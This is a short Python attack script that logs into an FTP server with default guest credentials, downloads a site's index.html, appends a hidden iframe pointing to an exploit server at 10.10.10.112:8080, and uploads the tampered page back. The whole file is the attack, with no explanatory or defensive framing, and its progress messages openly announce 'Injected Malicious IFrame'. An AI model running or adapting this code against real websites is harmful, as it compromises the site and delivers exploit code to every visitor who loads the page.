#!/usr/bin/python
# -*- coding:utf-8 -*-
import ftplib


def inject_page(ftp, page, redirect):
    with open(page + '.tmp', 'w') as f:
        ftp.retrlines('RETR ' + page, f.write)
        print('[+] Download Page: ' + page)
        f.write(redirect)
        f.close()
        print('[+] Injected Malicious IFrame on: ' + page)
        ftp.retrlines('STOR ' + page, open(page + '.tmp'))
        print('[+] Uploaded Injected Page: ' + page)


host = '192.168.0.1'
username = 'guest'
password = 'guest'
ftp = ftplib.FTP(host)
ftp.login(username, password)
redirect = '<iframe src="http://10.10.10.112:8080/exploit"></iframe>'
inject_page(ftp, 'index.html', redirect)





